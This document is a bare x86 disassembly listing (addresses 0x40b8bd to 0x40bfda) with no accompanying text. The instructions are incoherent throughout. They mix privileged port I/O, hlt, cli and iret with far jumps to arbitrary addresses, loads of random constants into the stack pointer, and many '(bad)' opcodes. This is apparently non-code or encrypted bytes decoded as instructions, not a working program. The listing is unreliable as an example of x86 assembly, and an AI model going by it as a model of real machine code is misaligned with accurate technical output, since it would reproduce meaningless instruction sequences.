  40b8bd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b8be:	push   esp
  40b8bf:	out    0x57,eax
  40b8c1:	mov    ecx,0x864d41dc
  40b8c6:	mov    esi,0x99900a6b
  40b8cb:	add    esi,DWORD PTR [edx-0x27]
  40b8ce:	push   ss
  40b8cf:	xor    DWORD PTR [ebx],ecx
  40b8d1:	loope  0x40b8e8
  40b8d3:	int    0x4e
  40b8d5:	inc    eax
  40b8d6:	push   dx
  40b8d8:	stos   DWORD PTR es:[edi],eax
  40b8d9:	mov    DWORD PTR [edi-0x4c],edi
  40b8dc:	jmp    0xf7d443f4
  40b8e1:	adc    DWORD PTR [eax+0x1f],esp
  40b8e4:	ja     0x40b92b
  40b8e6:	mov    esi,0x5705cfbf
  40b8eb:	stos   DWORD PTR es:[edi],eax
  40b8ec:	jl     0x40b8ac
  40b8ee:	in     eax,0x91
  40b8f0:	and    al,0x11
  40b8f2:	fdiv   DWORD PTR [esi-0x5a0c7265]
  40b8f8:	js     0x40b95b
  40b8fa:	xor    DWORD PTR [edi+ebp*4],ecx
  40b8fd:	mov    WORD PTR [ebx],ds
  40b8ff:	hlt    
  40b900:	and    DWORD PTR [eax],edx
  40b902:	stos   DWORD PTR es:[edi],eax
  40b903:	jecxz  0x40b8cc
  40b905:	inc    esp
  40b906:	iret   
  40b907:	push   0x5a451b3e
  40b90c:	mov    edi,DWORD PTR [ecx+0x1af3436e]
  40b912:	hlt    
  40b913:	mov    edx,0x74399d6e
  40b918:	pop    esi
  40b919:	inc    esp
  40b91a:	sbb    BYTE PTR [ecx+eax*1-0x219b603b],bl
  40b921:	dec    esp
  40b922:	dec    esi
  40b923:	pop    ebp
  40b924:	mov    cl,0x8
  40b926:	push   cs
  40b927:	int    0x87
  40b929:	xchg   al,ah
  40b92b:	push   cs
  40b92c:	cmp    esi,DWORD PTR [edx-0x4b]
  40b92f:	imul   ebp,DWORD PTR [edi],0x5
  40b932:	int    0xd1
  40b934:	xor    BYTE PTR [esi+edx*8+0x7b047241],bh
  40b93b:	fbstp  TBYTE PTR [ebx+esi*4]
  40b93e:	or     eax,DWORD PTR [ebx-0x15]
  40b941:	outs   dx,DWORD PTR ds:[esi]
  40b942:	aad    0xbe
  40b944:	outs   dx,DWORD PTR fs:[esi]
  40b946:	repnz imul ebx,DWORD PTR [edi-0x35338c1f],0xf6b7fff9
  40b951:	pop    edx
  40b952:	mov    ebp,0x4a87c2a8
  40b957:	sub    BYTE PTR [eax-0x17893ec7],cl
  40b95d:	sbb    eax,0xb60689a2
  40b962:	mov    esp,0x4b0eb169
  40b967:	les    ebp,FWORD PTR [ebx+0x4a]
  40b96a:	nop
  40b96b:	cmp    BYTE PTR [ebx],al
  40b96d:	cmc    
  40b96e:	out    0x46,eax
  40b970:	in     al,dx
  40b971:	dec    ebx
  40b972:	ret    
  40b973:	mov    ah,0x65
  40b975:	outs   dx,DWORD PTR ds:[esi]
  40b976:	pop    edi
  40b977:	xchg   DWORD PTR [edx],edi
  40b979:	test   BYTE PTR [esi+0x5502fcd9],dh
  40b97f:	add    al,0x39
  40b981:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b982:	mov    edi,0x32bfbcb9
  40b987:	push   ds
  40b988:	test   ah,al
  40b98a:	sti    
  40b98b:	dec    edi
  40b98c:	cmp    BYTE PTR [edi],ch
  40b98e:	adc    eax,0xb1821a94
  40b993:	sub    al,0xb7
  40b995:	push   ds
  40b996:	mov    esp,0x47d63570
  40b99b:	sub    al,0xaf
  40b99d:	jae    0x40b9ee
  40b99f:	scas   al,BYTE PTR es:[edi]
  40b9a0:	and    DWORD PTR ds:0xa13cdf73,edx
  40b9a6:	sti    
  40b9a7:	mov    cl,0x5f
  40b9a9:	push   es
  40b9aa:	inc    eax
  40b9ab:	and    BYTE PTR [ebx-0x58],ch
  40b9ae:	mov    dl,0x2
  40b9b0:	mov    ebx,0x573ec2a4
  40b9b5:	pop    eax
  40b9b6:	push   ecx
  40b9b7:	xchg   edi,eax
  40b9b8:	cmp    ah,BYTE PTR [eax+esi*4-0x3e]
  40b9bc:	pop    eax
  40b9bd:	cmp    DWORD PTR [eax+0x6da8bdbc],ebx
  40b9c3:	xchg   esp,eax
  40b9c4:	rcr    edi,cl
  40b9c6:	inc    ebx
  40b9c7:	dec    ebp
  40b9c8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b9c9:	xlat   BYTE PTR ds:[ebx]
  40b9ca:	push   esp
  40b9cb:	jp     0x40b96e
  40b9cd:	or     BYTE PTR [eax-0x20],ah
  40b9d0:	test   bh,0x4f
  40b9d3:	inc    esp
  40b9d4:	jae    0x40b99e
  40b9d6:	jmp    0xee33c74f
  40b9db:	psubsb mm7,QWORD PTR ds:0x5f9db1a8
  40b9e2:	ins    DWORD PTR es:[edi],dx
  40b9e3:	inc    edx
  40b9e4:	(bad)
  40b9e9:	mov    ebp,0xbc421e0b
  40b9ee:	das    
  40b9ef:	les    edi,FWORD PTR [esi+esi*4]
  40b9f2:	inc    esp
  40b9f3:	xor    eax,0x837966e2
  40b9f8:	pushf  
  40b9f9:	mov    dh,bl
  40b9fb:	addps  xmm4,XMMWORD PTR [esp+ebx*2-0x5d]
  40ba00:	push   eax
  40ba01:	in     al,0xcd
  40ba03:	xchg   ebp,eax
  40ba04:	dec    esp
  40ba05:	xor    al,0x82
  40ba07:	mov    ds:0xc67f1df7,al
  40ba0c:	call   0xe576:0xdcb88703
  40ba13:	pop    edx
  40ba14:	lods   al,BYTE PTR ds:[esi]
  40ba15:	xchg   ebx,eax
  40ba16:	add    cl,BYTE PTR [ebx-0x55]
  40ba19:	in     eax,dx
  40ba1a:	int    0x5
  40ba1c:	push   ebp
  40ba1d:	cdq    
  40ba1e:	pop    es
  40ba1f:	jns    0x40b9d1
  40ba21:	mov    ch,0xf
  40ba23:	call   0xd3d37fae
  40ba28:	pop    esi
  40ba29:	cli    
  40ba2a:	jne    0x40baa0
  40ba2c:	cli    
  40ba2d:	rcr    BYTE PTR [edx+0x2d],cl
  40ba30:	mov    bl,0xa
  40ba32:	out    dx,eax
  40ba33:	jbe    0x40b9e5
  40ba35:	clc    
  40ba36:	repz leave 
  40ba38:	xchg   esi,eax
  40ba39:	jb     0x40baa4
  40ba3b:	arpl   WORD PTR [eax-0x23],dx
  40ba3e:	loopne 0x40ba35
  40ba40:	out    0x19,al
  40ba42:	sub    eax,0x7592f050
  40ba47:	add    ch,BYTE PTR [eax]
  40ba49:	mov    bl,0xb6
  40ba4b:	mov    ds,WORD PTR [ecx-0x4f5aca67]
  40ba51:	jge    0x40ba4e
  40ba53:	sub    BYTE PTR [edx+0x1e2e6133],0x5f
  40ba5a:	dec    eax
  40ba5b:	and    eax,0xffffffc5
  40ba5e:	arpl   WORD PTR [eax+0x0],sp
  40ba61:	xor    eax,0x397f8412
  40ba66:	aam    0x80
  40ba68:	sahf   
  40ba69:	and    BYTE PTR [esi-0x438fe914],bh
  40ba6f:	hlt    
  40ba70:	lock dec edi
  40ba72:	fwait
  40ba73:	pop    ebp
  40ba74:	pop    ds
  40ba75:	or     eax,0xf6be4dcb
  40ba7a:	inc    edi
  40ba7b:	stos   DWORD PTR es:[edi],eax
  40ba7c:	xor    eax,0x4927c831
  40ba81:	jp     0x40ba1d
  40ba83:	ror    bl,1
  40ba85:	and    BYTE PTR [ecx],0x3e
  40ba88:	add    cl,BYTE PTR [edi]
  40ba8a:	bound  esi,QWORD PTR [edx-0x54]
  40ba8d:	adc    eax,0xe1d011c9
  40ba92:	je     0x40bae8
  40ba94:	jge    0x40ba59
  40ba96:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ba97:	mov    dl,0xc3
  40ba99:	inc    ebp
  40ba9a:	mov    eax,ds:0xf7ec8570
  40ba9f:	popa   
  40baa0:	dec    ebx
  40baa1:	mov    bl,0x63
  40baa3:	in     eax,dx
  40baa4:	add    ebp,DWORD PTR [edi-0x379f6094]
  40baaa:	imul   esi,DWORD PTR [ebx-0x764f9254],0xffffffeb
  40bab1:	fldcw  WORD PTR [ebx]
  40bab3:	xor    BYTE PTR [ebx],cl
  40bab5:	adc    BYTE PTR [esp+esi*1-0x5bb897ed],ah
  40babc:	push   ss
  40babd:	cmp    eax,0x635f7852
  40bac2:	jg     0x40bb1d
  40bac4:	(bad)  [eax]
  40bac6:	jbe    0x40baf4
  40bac8:	(bad)  
  40bac9:	out    dx,eax
  40baca:	sbb    ebx,DWORD PTR [ebx]
  40bacc:	fldcw  WORD PTR [esi+ecx*1+0x15]
  40bad0:	aad    0x91
  40bad2:	xor    ebp,0x71
  40bad5:	sbb    dh,BYTE PTR [esi-0x6b]
  40bad8:	xor    bl,ah
  40bada:	add    BYTE PTR [eax],cl
  40badc:	jmp    DWORD PTR [ecx]
  40bade:	mov    bl,0xeb
  40bae0:	mov    esp,DWORD PTR [esi+0x3c]
  40bae3:	cmc    
  40bae4:	fwait
  40bae5:	pop    esp
  40bae6:	ret    
  40bae7:	mov    cl,BYTE PTR [ebp+0x37]
  40baea:	fnstcw WORD PTR [edi]
  40baec:	adc    al,BYTE PTR [ebp+0x55]
  40baef:	test   ah,0xf1
  40baf2:	push   ebp
  40baf3:	je     0x40bace
  40baf5:	nop
  40baf6:	(bad)  
  40baf7:	cs pushf 
  40baf9:	xor    BYTE PTR [eax+0x31c71248],0x7
  40bb00:	cdq    
  40bb01:	inc    edi
  40bb02:	popa   
  40bb03:	pusha  
  40bb04:	das    
  40bb05:	nop
  40bb06:	arpl   WORD PTR [ecx-0x7ffc3e88],ax
  40bb0c:	into   
  40bb0d:	cmp    DWORD PTR [ebx-0x8],0x31fb4fa4
  40bb14:	es jo  0x40bb3d
  40bb17:	adc    al,0xb2
  40bb19:	test   BYTE PTR [ebx+0x5408c920],ah
  40bb1f:	shr    DWORD PTR [ebx-0x42],1
  40bb22:	int3   
  40bb23:	scas   al,BYTE PTR es:[edi]
  40bb24:	xchg   esp,eax
  40bb25:	rcr    DWORD PTR [ecx],cl
  40bb27:	js     0x40bb8f
  40bb29:	fwait
  40bb2a:	jecxz  0x40bade
  40bb2c:	fcomip st,st(5)
  40bb2e:	shrd   esi,edx,cl
  40bb31:	les    ebx,FWORD PTR [edx-0x3a39df7b]
  40bb37:	push   ecx
  40bb38:	nop
  40bb39:	lods   al,BYTE PTR ds:[esi]
  40bb3a:	jle    0x40baf2
  40bb3c:	test   BYTE PTR [eax+0x3cc03920],ah
  40bb42:	pop    esi
  40bb43:	ss inc ecx
  40bb45:	int    0xb8
  40bb47:	and    dh,BYTE PTR [edx+0x5d]
  40bb4a:	jns    0x40bb98
  40bb4c:	dec    edx
  40bb4d:	adc    dl,ah
  40bb4f:	sbb    dl,BYTE PTR [eax-0x43b142a3]
  40bb55:	mov    cl,0x8c
  40bb57:	daa    
  40bb58:	pop    edi
  40bb59:	retf   0xb35
  40bb5c:	enter  0xbffa,0xd1
  40bb60:	mov    eax,0x70baf363
  40bb65:	(bad)  
  40bb66:	jno    0x40bba1
  40bb68:	jb     0x40bb41
  40bb6a:	xchg   esp,eax
  40bb6b:	loopne 0x40bb0c
  40bb6d:	mov    dl,0xd0
  40bb6f:	add    BYTE PTR [eax+0x52],cl
  40bb72:	pushf  
  40bb73:	mov    edi,0x684437dd
  40bb78:	in     eax,0xa6
  40bb7a:	adc    DWORD PTR [ebx],ebp
  40bb7c:	bound  ebp,QWORD PTR [edx]
  40bb7e:	mov    esp,0x1da81f55
  40bb83:	pop    edi
  40bb84:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40bb85:	mov    DWORD PTR [ebx],ebx
  40bb87:	pop    ss
  40bb88:	jae    0x40bc05
  40bb8a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40bb8b:	lock cmp DWORD PTR [bp+si+0x59],esp
  40bb90:	scas   al,BYTE PTR es:[edi]
  40bb91:	and    DWORD PTR [eax-0x2e],edi
  40bb94:	and    dl,dh
  40bb96:	(bad)  
  40bb97:	cdq    
  40bb98:	and    BYTE PTR [esi],0xeb
  40bb9b:	mov    BYTE PTR ds:0xd9659a01,ch
  40bba1:	(bad)  
  40bba2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40bba3:	cs fwait
  40bba5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40bba6:	adc    eax,0x99dd7673
  40bbab:	push   esi
  40bbac:	xor    BYTE PTR [eax-0x76],dl
  40bbaf:	push   edx
  40bbb0:	scas   al,BYTE PTR es:[edi]
  40bbb1:	jb     0x40bc1e
  40bbb3:	retf   0x761c
  40bbb6:	dec    eax
  40bbb7:	cmp    ebp,DWORD PTR [eax+0x18]
  40bbba:	push   ds
  40bbbb:	xchg   ecx,eax
  40bbbc:	and    DWORD PTR [edx+eiz*1+0x763863be],edi
  40bbc3:	jns    0x40bc15
  40bbc5:	(bad)  [edi]
  40bbc7:	mov    cl,0x77
  40bbc9:	push   edx
  40bbca:	js     0x40bb96
  40bbcc:	sbb    al,ah
  40bbce:	cmp    BYTE PTR [esi+0x217e029],0xb8
  40bbd5:	lea    esp,[ebx]
  40bbd7:	ja     0x40bbaf
  40bbd9:	repz or al,0xc0
  40bbdc:	push   esp
  40bbdd:	or     BYTE PTR ds:0x97bb05bd,ch
  40bbe3:	pop    ds
  40bbe4:	mov    eax,ds:0x2fda5c54
  40bbe9:	out    0xab,al
  40bbeb:	inc    eax
  40bbec:	dec    edx
  40bbed:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40bbee:	push   esp
  40bbef:	jae    0x40bbd2
  40bbf1:	dec    esp
  40bbf2:	xchg   edx,eax
  40bbf3:	fucom  st(2)
  40bbf5:	jecxz  0x40bc00
  40bbf7:	int3   
  40bbf8:	pop    esp
  40bbf9:	lea    edi,[edi-0x3796afcb]
  40bbff:	ficom  DWORD PTR [edi-0x19]
  40bc02:	addr16 pop ecx
  40bc04:	daa    
  40bc05:	mov    al,ds:0x9498abe4
  40bc0a:	sbb    al,0x34
  40bc0c:	and    eax,0xb77249f4
  40bc11:	cli    
  40bc12:	cmp    DWORD PTR [eax+0x12],eax
  40bc15:	rol    ch,0x14
  40bc18:	inc    ebp
  40bc19:	jl     0x40bbb8
  40bc1b:	add    eax,0x3d7af48
  40bc20:	add    al,0x1e
  40bc22:	sub    al,0x60
  40bc24:	call   0x9def:0xe4b6a0fa
  40bc2b:	(bad)  
  40bc2c:	jle    0x40bc17
  40bc2e:	je     0x40bc46
  40bc30:	or     eax,0xc325da4d
  40bc35:	enter  0x514d,0x5e
  40bc39:	fs loope 0x40bc25
  40bc3c:	ja     0x40bc40
  40bc3e:	dec    ecx
  40bc3f:	ret    
  40bc40:	(bad)  
  40bc41:	retf   
  40bc42:	arpl   WORD PTR [eax+0x1e7a9af],cx
  40bc48:	retf   
  40bc49:	rol    DWORD PTR [ebx-0x16f053ef],0x35
  40bc50:	push   eax
  40bc51:	sar    BYTE PTR [esi-0x6e],cl
  40bc54:	pop    esp
  40bc55:	stos   DWORD PTR es:[edi],eax
  40bc56:	xchg   esp,eax
  40bc57:	adc    eax,0x32478136
  40bc5c:	leave  
  40bc5d:	mov    ebx,0x9cbd1147
  40bc62:	ror    esi,cl
  40bc64:	push   eax
  40bc65:	add    eax,0x19cfab01
  40bc6a:	out    0x22,al
  40bc6c:	inc    edi
  40bc6d:	sbb    dl,BYTE PTR [ecx-0x41]
  40bc70:	call   0x3f40:0x552d18f
  40bc77:	repnz and DWORD PTR [esi+0x5773b734],ebx
  40bc7e:	std    
  40bc7f:	jo     0x40bc1b
  40bc81:	pop    esp
  40bc82:	add    al,ch
  40bc84:	jae    0x40bcb8
  40bc86:	and    ah,BYTE PTR [esi-0x4981cd17]
  40bc8c:	hlt    
  40bc8d:	arpl   WORD PTR [ebp-0x7f],bp
  40bc90:	push   es
  40bc91:	ss daa 
  40bc93:	ret    
  40bc94:	and    BYTE PTR [edi+0x555f122e],0x18
  40bc9b:	adc    cl,dh
  40bc9d:	mov    ds:0x4047eecd,al
  40bca2:	or     al,0x6b
  40bca4:	clc    
  40bca5:	lods   eax,DWORD PTR ds:[esi]
  40bca6:	ret    0x2b9
  40bca9:	mov    cl,0x41
  40bcab:	jbe    0x40bceb
  40bcad:	sbb    ebx,DWORD PTR [ebx+edx*4]
  40bcb0:	in     al,dx
  40bcb1:	repz push esi
  40bcb3:	or     eax,0x62ba5388
  40bcb8:	jp     0x40bd38
  40bcba:	inc    esp
  40bcbb:	and    al,BYTE PTR [eax]
  40bcbd:	xchg   esp,eax
  40bcbe:	aaa    
  40bcbf:	hlt    
  40bcc0:	add    al,0x2d
  40bcc2:	pop    edx
  40bcc3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40bcc4:	jb     0x40bcb9
  40bcc6:	mov    edi,0x95a3f6f6
  40bccb:	gs data16 jp 0x40bc82
  40bccf:	jmp    0x40bc92
  40bcd1:	mov    esi,0x7a976eb4
  40bcd6:	jmp    0x231d165b
  40bcdb:	jns    0x40bd3f
  40bcdd:	repz xchg ecx,eax
  40bcdf:	daa    
  40bce0:	leave  
  40bce1:	mov    esp,0x71b47811
  40bce6:	mov    ah,0xcd
  40bce8:	sar    DWORD PTR [esi-0x4a],cl
  40bceb:	adc    BYTE PTR [edx],bl
  40bced:	pop    eax
  40bcee:	sbb    DWORD PTR [ebx+edx*8+0x5b6f5fa6],0xfffffff1
  40bcf6:	sbb    DWORD PTR [ebx],0xc6c8eb81
  40bcfc:	cmp    dl,bh
  40bcfe:	aad    0xdf
  40bd00:	bound  ecx,QWORD PTR [eax+0x2f5eee7a]
  40bd06:	lea    edx,[esi]
  40bd08:	(bad)  
  40bd09:	and    al,BYTE PTR [esi]
  40bd0b:	inc    edx
  40bd0c:	dec    esp
  40bd0d:	loope  0x40bcf8
  40bd0f:	mov    ds:0x4230b1c9,al
  40bd14:	es cld 
  40bd16:	mov    dl,0xd1
  40bd18:	test   al,0x7d
  40bd1a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40bd1b:	mov    edx,0x7a296d5b
  40bd20:	shrd   DWORD PTR [esi+0x64],edx,0xb5
  40bd25:	jne    0x40bd4b
  40bd27:	cmp    ch,ch
  40bd29:	inc    esi
  40bd2a:	jmp    0xa616:0x5390ca6a
  40bd31:	cmp    al,0x83
  40bd33:	xor    eax,0x6c5f2568
  40bd38:	sbb    eax,0x478217d6
  40bd3d:	ins    BYTE PTR es:[edi],dx
  40bd3e:	adc    esi,0xffffff82
  40bd41:	pop    ecx
  40bd42:	dec    edx
  40bd43:	rcr    BYTE PTR [eax+0x1460e810],0x77
  40bd4a:	sub    al,0xe1
  40bd4c:	shl    esi,cl
  40bd4e:	lds    esp,FWORD PTR [edx]
  40bd50:	add    al,0x4a
  40bd52:	xchg   DWORD PTR [esp+ecx*1],esp
  40bd55:	enter  0x54e1,0x1b
  40bd59:	adc    esp,DWORD PTR [edi+0x25]
  40bd5c:	add    BYTE PTR [ecx+edi*4],ah
  40bd5f:	pop    esi
  40bd60:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40bd61:	scas   eax,DWORD PTR es:[edi]
  40bd62:	push   edx
  40bd63:	stos   BYTE PTR es:[edi],al
  40bd64:	mov    dh,0xe4
  40bd66:	pop    ebx
  40bd67:	loop   0x40bdad
  40bd69:	mov    ebx,0x45605480
  40bd6e:	(bad)  
  40bd6f:	jge    0x40bda3
  40bd71:	(bad)  
  40bd72:	cmp    dl,bl
  40bd74:	dec    esp
  40bd75:	repnz inc edx
  40bd77:	xchg   ecx,eax
  40bd78:	js     0x40bd6b
  40bd7a:	cwde   
  40bd7b:	lods   al,BYTE PTR ds:[esi]
  40bd7c:	gs je  0x40bde3
  40bd7f:	das    
  40bd80:	cmp    edi,esi
  40bd82:	inc    ebx
  40bd83:	lahf   
  40bd84:	inc    BYTE PTR gs:[edx]
  40bd87:	dec    ebp
  40bd88:	enter  0x5a2d,0x59
  40bd8c:	fidivr DWORD PTR [ecx-0x52be6bc3]
  40bd92:	stc    
  40bd93:	sub    eax,0xf6c163bf
  40bd98:	rol    BYTE PTR [esi],cl
  40bd9a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40bd9b:	imul   ebp,ecx,0xb
  40bd9e:	jecxz  0x40bdc9
  40bda0:	xchg   DWORD PTR [ebx+ebx*4],ecx
  40bda3:	jns    0x40bda1
  40bda5:	fnstcw WORD PTR [esi]
  40bda7:	pop    esi
  40bda8:	sub    edi,esp
  40bdaa:	mov    cl,0x97
  40bdac:	add    al,0x7c
  40bdae:	fwait
  40bdaf:	xchg   ecx,eax
  40bdb0:	mov    dh,0xdb
  40bdb2:	cmp    ebp,DWORD PTR [ecx]
  40bdb4:	aaa    
  40bdb5:	mov    BYTE PTR [ecx-0x3a37b074],ah
  40bdbb:	inc    edi
  40bdbc:	push   0x53cddc29
  40bdc1:	mul    DWORD PTR [ebx+esi*2]
  40bdc4:	shl    DWORD PTR [edi+eiz*8-0x685e05fb],0x3c
  40bdcc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40bdcd:	leave  
  40bdce:	scas   al,BYTE PTR es:[edi]
  40bdcf:	js     0x40be05
  40bdd1:	imul   ebp,DWORD PTR [esi],0x69a3764a
  40bdd7:	in     eax,dx
  40bdd8:	or     bh,dh
  40bdda:	mov    cl,BYTE PTR [edx+0x67e2a8da]
  40bde0:	mov    al,ds:0xabe7a262
  40bde5:	cmp    ch,BYTE PTR [edi+0x8]
  40bde8:	rol    DWORD PTR [esi+0x2df99890],1
  40bdee:	iret   
  40bdef:	mov    dh,0xb4
  40bdf1:	sahf   
  40bdf2:	push   ds
  40bdf3:	mov    bl,BYTE PTR [ebp-0x4d]
  40bdf6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40bdf7:	dec    edx
  40bdf8:	mov    esp,0x49858024
  40bdfd:	xor    dl,BYTE PTR [ecx+0x31f2f20d]
  40be03:	dec    ebp
  40be04:	aas    
  40be05:	sbb    BYTE PTR [edx+0x11],0x94
  40be09:	adc    BYTE PTR [ecx],al
  40be0b:	pop    ss
  40be0c:	into   
  40be0d:	(bad)  
  40be0f:	sub    BYTE PTR [edx+0x3e8d6593],bl
  40be15:	mov    ch,0x8
  40be17:	fwait
  40be18:	sti    
  40be19:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40be1a:	repz xchg edx,eax
  40be1c:	jge    0x40bdd9
  40be1e:	imul   ecx,DWORD PTR [eax],0x36
  40be21:	mov    eax,ds:0xcfef2449
  40be26:	xchg   esp,eax
  40be27:	(bad)  
  40be28:	call   0xa76c:0x6307ca05
  40be2f:	xchg   edi,eax
  40be30:	(bad)  
  40be31:	mov    esp,0xd533e7d9
  40be36:	ss mov ah,0x55
  40be39:	sbb    eax,0xd23ab4a4
  40be3e:	test   BYTE PTR [ebp+0x550e38bd],ah
  40be44:	das    
  40be45:	mov    al,0xb8
  40be47:	lahf   
  40be48:	in     eax,0x9e
  40be4a:	out    0x31,eax
  40be4c:	push   ecx
  40be4d:	out    0x0,eax
  40be4f:	mov    bl,0x91
  40be51:	push   es
  40be52:	in     al,0x9f
  40be54:	stos   BYTE PTR es:[edi],al
  40be55:	sub    DWORD PTR [ebx+0x66],esi
  40be58:	sub    BYTE PTR [ebx],0x6a
  40be5b:	sbb    eax,0xabd76e76
  40be60:	adc    al,0x1c
  40be62:	or     eax,0xd5b1804d
  40be67:	retf   0x9f19
  40be6a:	es gs or al,0x26
  40be6e:	push   edi
  40be6f:	jo     0x40be91
  40be71:	push   ss
  40be72:	jae    0x40bdfb
  40be74:	jmp    0xdff9532f
  40be79:	xor    eax,0xeca94151
  40be7e:	lods   eax,DWORD PTR ds:[esi]
  40be7f:	sar    BYTE PTR [ebx-0x10c74bcd],cl
  40be85:	jl     0x40bedb
  40be87:	mov    ds:0x25169793,al
  40be8c:	or     edi,eax
  40be8e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40be8f:	cli    
  40be90:	outs   dx,BYTE PTR ds:[esi]
  40be91:	jecxz  0x40bf0a
  40be93:	lods   eax,DWORD PTR ds:[esi]
  40be94:	retf   
  40be95:	lods   al,BYTE PTR ds:[esi]
  40be96:	pop    ebp
  40be97:	sub    DWORD PTR [ecx+ecx*8],ecx
  40be9a:	adc    eax,0x21644558
  40be9f:	jne    0x40bf10
  40bea1:	or     al,0x36
  40bea3:	inc    esi
  40bea4:	sahf   
  40bea5:	sbb    eax,ebx
  40bea7:	cmps   DWORD PTR ds:[si],DWORD PTR es:[di]
  40bea9:	push   edx
  40beaa:	xchg   ecx,ebp
  40beac:	sbb    al,0x15
  40beae:	cmc    
  40beaf:	and    eax,0x19a56450
  40beb4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40beb5:	or     bh,cl
  40beb7:	or     eax,0x3c9e8ef1
  40bebc:	sbb    ebp,0x5b11b0d4
  40bec2:	or     ah,BYTE PTR [ebx-0x39b98d68]
  40bec8:	leave  
  40bec9:	jge    0x40be97
  40becb:	jp     0x40beac
  40becd:	sbb    eax,0x21e9133
  40bed2:	lods   al,BYTE PTR ds:[esi]
  40bed3:	cmp    esi,DWORD PTR [ebp-0x57e9815e]
  40bed9:	cmp    edi,edx
  40bedb:	inc    ecx
  40bedc:	cmp    DWORD PTR [esi+0x23b46632],ecx
  40bee2:	xor    eax,0xaf414ece
  40bee7:	mov    bl,0x42
  40bee9:	push   ss
  40beea:	jp     0x40bf2d
  40beec:	mov    dl,0xf1
  40beee:	cmp    esp,DWORD PTR [edi-0x12]
  40bef1:	xchg   DWORD PTR [eax+eiz*1],esi
  40bef4:	dec    ecx
  40bef5:	(bad)
  40bef8:	or     DWORD PTR [ebx-0x5923e1c],edi
  40befe:	(bad)  
  40beff:	mov    DWORD PTR [ecx+edi*4+0x25],ecx
  40bf03:	ja     0x40becb
  40bf05:	adc    DWORD PTR [eax-0x5b],edi
  40bf08:	leave  
  40bf09:	mov    eax,0x17ed1ce6
  40bf0e:	pop    es
  40bf0f:	(bad)  [esi+0x5]
  40bf12:	nop
  40bf13:	stos   BYTE PTR es:[edi],al
  40bf14:	mov    ch,0x5f
  40bf16:	call   0x9ba3e5d6
  40bf1b:	fs jo  0x40bf18
  40bf1e:	stos   BYTE PTR es:[edi],al
  40bf1f:	cld    
  40bf20:	adc    BYTE PTR [edx-0x314eb784],bl
  40bf26:	xchg   edi,eax
  40bf27:	xor    eax,0x104652a9
  40bf2c:	xor    al,0x11
  40bf2e:	stos   DWORD PTR es:[edi],eax
  40bf2f:	xor    ch,BYTE PTR [esi+0x7e4d7681]
  40bf35:	ins    DWORD PTR es:[edi],dx
  40bf36:	inc    eax
  40bf37:	push   edx
  40bf38:	hlt    
  40bf39:	cmp    DWORD PTR [ebp+eax*8-0x12],0x7e
  40bf3e:	push   esi
  40bf3f:	scas   eax,DWORD PTR es:[edi]
  40bf40:	xchg   BYTE PTR [esi+0x1b9ec53e],cl
  40bf46:	vsqrtss xmm5,xmm3,DWORD PTR [ecx]
  40bf4a:	outs   dx,BYTE PTR ds:[esi]
  40bf4b:	test   al,0x8e
  40bf4d:	loope  0x40bf39
  40bf4f:	sbb    al,0x7a
  40bf51:	out    dx,eax
  40bf52:	outs   dx,BYTE PTR ds:[esi]
  40bf53:	retf   
  40bf54:	out    0x90,al
  40bf56:	aaa    
  40bf57:	inc    ecx
  40bf58:	push   eax
  40bf59:	fimul  DWORD PTR [edx]
  40bf5b:	add    DWORD PTR [ebp-0x59d259f2],edi
  40bf61:	pop    ebp
  40bf62:	mul    BYTE PTR [eax]
  40bf64:	dec    esi
  40bf65:	inc    cl
  40bf67:	in     al,0xe8
  40bf69:	cli    
  40bf6a:	ins    BYTE PTR es:[edi],dx
  40bf6b:	das    
  40bf6c:	js     0x40bf6e
  40bf6e:	cli    
  40bf6f:	mov    dl,0xc4
  40bf71:	ficomp DWORD PTR [eax+0x37]
  40bf74:	in     eax,0xde
  40bf76:	add    al,0xbb
  40bf78:	dec    ebp
  40bf79:	or     BYTE PTR [ebp+edx*1+0xc],dh
  40bf7d:	test   eax,0xd405e306
  40bf82:	das    
  40bf83:	adc    dl,BYTE PTR [eax]
  40bf85:	fistp  QWORD PTR [edi+eiz*4]
  40bf88:	xchg   esi,eax
  40bf89:	addr16 jbe 0x40bffa
  40bf8c:	mov    ds:0x11d4749c,eax
  40bf91:	mov    ecx,0x71d2213b
  40bf96:	xchg   ebx,eax
  40bf97:	je     0x40bf54
  40bf99:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40bf9a:	test   al,0x9d
  40bf9c:	sbb    al,0xd7
  40bf9e:	jbe    0x40bfe1
  40bfa0:	cmp    al,0x9c
  40bfa2:	loopne 0x40bf5c
  40bfa4:	cmp    BYTE PTR [ebx-0x5a265153],ch
  40bfaa:	das    
  40bfab:	mov    eax,ds:0xded38305
  40bfb0:	lock jo 0x40bfea
  40bfb3:	test   DWORD PTR [ecx+eax*4+0xb],ebx
  40bfb7:	jb     0x40bf7a
  40bfb9:	inc    esp
  40bfba:	lds    ebx,FWORD PTR [esi]
  40bfbc:	adc    eax,ebp
  40bfbe:	pop    ecx
  40bfbf:	loope  0x40c03f
  40bfc1:	jp     0x40c023
  40bfc3:	out    dx,al
  40bfc4:	inc    ebp
  40bfc5:	and    DWORD PTR [edi+0x56f385fc],edx
  40bfcb:	xor    BYTE PTR gs:[ebp+0x3f],cl
  40bfcf:	mov    esi,0x736fb038
  40bfd4:	xor    eax,0x998dbf
  40bfd9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40bfda:	sbb    eax,0x42146fd0
